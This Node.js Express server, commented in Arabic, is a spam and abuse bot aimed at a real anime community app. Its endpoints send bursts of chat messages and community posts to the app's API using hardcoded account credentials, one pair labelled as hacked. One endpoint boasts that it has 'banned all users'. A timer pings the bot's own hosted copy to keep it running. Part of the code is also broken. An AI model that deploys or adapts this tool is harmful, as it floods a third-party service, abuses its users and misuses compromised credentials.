import express from "express";
import request  from "request";
//import cron  from 'node-cron';

import qs  from "qs";

const app = express();
const port = 3000;
const message=`......`;
const post=`........`;
// اذا كنت تبي تسوي سبام حط true و اذا لا حط false 👇
// الاولى للدردشة والثانيه للمجتمع
const sendMessageBool=true;
const sendPostBool=true;
// عدد المرات في الدقيقه الواحده👇
// اكثر شيء 60 اذا زدت عليها السيرفر بعلق
const count = 1;
const email= `hacked.mebm2@gmail.com`;
const password=`12345678`;

var minutes = 1/count,the_interval = minutes * 60 * 1000;

function sendPost(spam) {
     let postData={  post: post, hasFire: !1, hasAnime: !1, hasImage: "", anime: [], youtube: "", userAddress: '2.2.2.2' } ;
      let body ={
      email:spam?email:`123456789xdf1@gmail.com`, password:spam?password:`ABCD.xdf`, useragent: "IBRAHIMSEVEN",item:
      btoa(unescape(encodeURIComponent(JSON.stringify(postData)))), android: true};
     
    request({
        url:"https://app.sanime.net/function/h10.php?page=sendPost",
        method: "POST",
        body:  qs.stringify(body),
    headers: {"Content-Type": "application/x-www-form-urlencoded",
    'User-Agent': 'IBRAHIMSEVEN',//SevenZero',
  },
    }, function (error, response, body){
         console.log("sended posts");
       /* if(response.statusCode==200){
            let json = JSON.parse(response.body);
            console.log(json.message);
    }*/
    });
}

function sendMessage(spam) {
      let body ={
      spam?email:`123456789xdf1@gmail.com`, password:spam?password:`ABCD.xdf`,m: 
       btoa(unescape(encodeURIComponent(message))) } ;
    request({
        url:"https://app.sanime.net/secure/chat/send.php",
        method: "POST",
        
        body:  qs.stringify(body),
    headers: {"Content-Type": "application/x-www-form-urlencoded",
    'User-Agent': 'IBRAHIMSEVEN',//SevenZero',
  },
    }, function (error, response, body){
         console.log("sended messages");
        /*if(response.statusCode==200){
          console.log(response.body);
    }*/
    });
}

/*setInterval(function() {
    
    try {
           if(sendPostBool){
                  sendPost();
           }
 if(sendMessageBool){
      sendMessage();
 }
    } catch (error) {
        console.log(`${error}`);
    }
}, the_interval);
*/
app.get('/', (req, res) => {
  res.send('Welcome to my server!');
});
app.get('/ban', (req, res) => {
  res.send('All users have been banned 😈');
     for (let i = 0; i < 60; i++) {
  try {
           if(sendPostBool){
                  sendPost(false);
           }
 if(sendMessageBool){
      sendMessage(false);
 }
    } catch (error) {
        console.log(`${error}`);
  }}
});
app.get('/spam', (req, res) => {
let count= req.query.count??0;
let isPost= req.query.isPost??true;
res.send('Spam have been sended 😈');
try 
{
     for (let i = 0; i < count; i++) {
     try 
     {
          if(isPost){
               sendPost(true);
          }
          if(!isPost){
               sendMessage(true);
          }
     } 
     catch (error) 
     {
          console.log(`${error}`);}
     }
} catch (error) {
     console.log(`${error}`);
}
});
//cron.schedule('* * * * *', () => {});
var min = 10, the_interval2 = min * 60 * 1000;
setInterval(function() {
   console.log('Rstarting.........');
    try {
        request({
        url: "https://sanime-band-e345.onrender.com/",
        method: "GET",
       
        }, function (error, response, body){
        if(response.statusCode==200){
           console.log('Rstart Completed.........');
        }
       
    });} catch (error) {
        console.log(`${error}`);
    }
  
}, the_interval2);

app.listen(port, () => {
  console.log(`Server is running on port ${port}`);
});
